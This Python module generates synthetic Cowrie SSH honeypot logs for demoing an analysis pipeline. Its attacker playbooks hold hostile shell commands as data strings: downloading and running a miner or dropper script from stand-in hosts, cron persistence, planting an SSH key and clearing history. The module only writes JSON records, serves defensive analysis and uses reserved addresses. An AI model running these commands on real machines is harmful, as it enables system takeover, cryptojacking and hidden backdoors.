"""Synthetic Cowrie log generator, so the pipeline can be demoed without a live honeypot.

Attacker behaviour is modelled on what real SSH honeypots record. All IPs come from the
RFC 5737 documentation ranges and all URLs use the reserved ``.example`` TLD, so the
sample data never points at a real host.
"""

from __future__ import annotations

import json
import random
from datetime import datetime, timedelta, timezone

DOC_NETS = ("192.0.2", "198.51.100", "203.0.113")

USERNAMES = ["root"] * 12 + ["admin"] * 5 + [
    "ubuntu", "pi", "oracle", "postgres", "test", "user", "git", "support", "ftpuser",
    "deploy", "guest", "hadoop", "minecraft", "nagios", "debian", "centos",
]
PASSWORDS = [
    "123456", "password", "admin", "root", "12345678", "qwerty", "123456789", "1234",
    "raspberry", "toor", "admin123", "P@ssw0rd", "changeme", "default", "111111",
    "ubnt", "letmein", "passw0rd", "Welcome1", "alpine", "test", "1q2w3e4r",
]
SPRAY_USERS = [
    "admin", "administrator", "ubuntu", "user", "test", "oracle", "postgres", "mysql",
    "git", "jenkins", "deploy", "ansible", "docker", "backup", "www-data", "ftp",
    "support", "dev", "staging", "nagios", "zabbix", "elastic", "hadoop", "tomcat",
]
CLIENTS = ["SSH-2.0-Go", "SSH-2.0-libssh_0.9.6", "SSH-2.0-PuTTY", "SSH-2.0-OpenSSH_8.9p1",
           "SSH-2.0-paramiko_3.4.0"]

PLAYBOOKS = {
    "miner": [
        "uname -a",
        "cat /proc/cpuinfo | grep name | wc -l",
        "free -m",
        "cd /tmp",
        "wget http://dl.malware.example/xmrig -O .systemd",
        "chmod +x .systemd",
        "./.systemd -o stratum+tcp://pool.miner.example:3333 -u 4ABC --background",
        "(crontab -l 2>/dev/null; echo '@reboot /tmp/.systemd') | crontab -",
        "history -c",
    ],
    "backdoor": [
        "whoami",
        "id",
        "cat /etc/passwd",
        "mkdir -p ~/.ssh",
        "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleKeyOnly attacker' >> ~/.ssh/authorized_keys",
        "chmod 600 ~/.ssh/authorized_keys",
        "unset HISTFILE",
    ],
    "dropper": [
        "cd /tmp || cd /var/run || cd /dev/shm",
        "wget http://203.0.113.66/bins.sh",
        "chmod 777 bins.sh",
        "sh bins.sh",
        "tftp 203.0.113.66 -c get tftp1.sh",
        "rm -rf bins.sh tftp1.sh",
    ],
    "recon": ["uname -a", "nproc", "lscpu", "w", "uptime", "cat /etc/os-release", "ls -la"],
}


class _Gen:
    def __init__(self, seed: int, start: datetime, days: int):
        self.rng = random.Random(seed)
        self.start = start
        self.span = timedelta(days=days).total_seconds()
        self.records: list[dict] = []
        self.used_ips: set[str] = set()

    def ip(self) -> str:
        while True:
            ip = f"{self.rng.choice(DOC_NETS)}.{self.rng.randint(1, 254)}"
            if ip not in self.used_ips:
                self.used_ips.add(ip)
                return ip

    def when(self) -> datetime:
        return self.start + timedelta(seconds=self.rng.uniform(0, self.span))

    def emit(self, eventid: str, ts: datetime, ip: str, session: str, **fields) -> None:
        self.records.append({
            "eventid": eventid,
            "timestamp": ts.strftime("%Y-%m-%dT%H:%M:%S.%fZ"),
            "src_ip": ip,
            "src_port": fields.pop("src_port", None),
            "dst_port": 22,
            "session": session,
            "sensor": "honeypot-01",
            "protocol": "ssh",
            **fields,
        })

    def session(self, ip: str, ts: datetime, logins: list[tuple[str, str, bool]],
                commands: list[str] = ()) -> datetime:
        sid = "%012x" % self.rng.getrandbits(48)
        port = self.rng.randint(32768, 60999)
        self.emit("cowrie.session.connect", ts, ip, sid, src_port=port)
        ts += timedelta(seconds=self.rng.uniform(0.2, 1.5))
        self.emit("cowrie.client.version", ts, ip, sid, version=self.rng.choice(CLIENTS))
        for user, pw, ok in logins:
            ts += timedelta(seconds=self.rng.uniform(0.5, 3))
            eid = "cowrie.login.success" if ok else "cowrie.login.failed"
            self.emit(eid, ts, ip, sid, username=user, password=pw)
        for cmd in commands:
            ts += timedelta(seconds=self.rng.uniform(1, 20))
            self.emit("cowrie.command.input", ts, ip, sid, input=cmd)
            if cmd.startswith("wget http"):
                url = cmd.split()[1]
                ts += timedelta(seconds=self.rng.uniform(1, 4))
                self.emit("cowrie.session.file_download", ts, ip, sid, url=url,
                          shasum="%064x" % self.rng.getrandbits(256))
        ts += timedelta(seconds=self.rng.uniform(0.5, 5))
        self.emit("cowrie.session.closed", ts, ip, sid)
        return ts

    def creds(self, n: int, user: str | None = None) -> list[tuple[str, str, bool]]:
        return [(user or self.rng.choice(USERNAMES), self.rng.choice(PASSWORDS), False)
                for _ in range(n)]

    def brute_forcer(self) -> None:
        ip = self.ip()
        for _ in range(self.rng.randint(1, 4)):
            ts = self.when()
            for _ in range(self.rng.randint(8, 50)):
                ts = self.session(ip, ts, self.creds(self.rng.randint(1, 3)))
                ts += timedelta(seconds=self.rng.uniform(0.5, 6))

    def low_and_slow(self) -> None:
        ip = self.ip()
        for _ in range(self.rng.randint(3, 8)):
            self.session(ip, self.when(), self.creds(1))

    def sprayer(self) -> None:
        ip = self.ip()
        password = self.rng.choice(["Welcome1", "P@ssw0rd", "Summer2026!", "changeme"])
        ts = self.when()
        users = self.rng.sample(SPRAY_USERS, self.rng.randint(12, len(SPRAY_USERS)))
        for user in users:
            ts = self.session(ip, ts, [(user, password, False)])
            ts += timedelta(seconds=self.rng.uniform(5, 40))

    def scanner(self) -> None:
        self.session(self.ip(), self.when(), [])

    def intruder(self, playbook: str) -> None:
        ip = self.ip()
        ts = self.when()
        for _ in range(self.rng.randint(5, 14)):
            ts = self.session(ip, ts, self.creds(3, user="root"))
            ts += timedelta(seconds=self.rng.uniform(0.5, 4))
        winning = self.rng.choice(["admin", "123456", "toor", "root"])
        self.session(ip, ts, [("root", winning, True)], PLAYBOOKS[playbook])


def generate(seed: int = 42, days: int = 7, start: datetime | None = None) -> list[dict]:
    """Return Cowrie-format records for ``days`` of simulated attack traffic."""
    if start is None:
        today = datetime.now(timezone.utc).replace(hour=0, minute=0, second=0, microsecond=0)
        start = today - timedelta(days=days)
    gen = _Gen(seed, start, days)
    scale = max(1, days // 7)
    for _ in range(25 * scale):
        gen.brute_forcer()
    for _ in range(12 * scale):
        gen.low_and_slow()
    for _ in range(3 * scale):
        gen.sprayer()
    for _ in range(60 * scale):
        gen.scanner()
    for playbook in ("miner", "backdoor", "dropper", "recon", "miner"):
        gen.intruder(playbook)
    gen.records.sort(key=lambda r: r["timestamp"])
    return gen.records


def write_sample(path: str, seed: int = 42, days: int = 7) -> int:
    records = generate(seed=seed, days=days)
    with open(path, "w", encoding="utf-8", newline="\n") as fh:
        for rec in records:
            fh.write(json.dumps(rec) + "\n")
    return len(records)
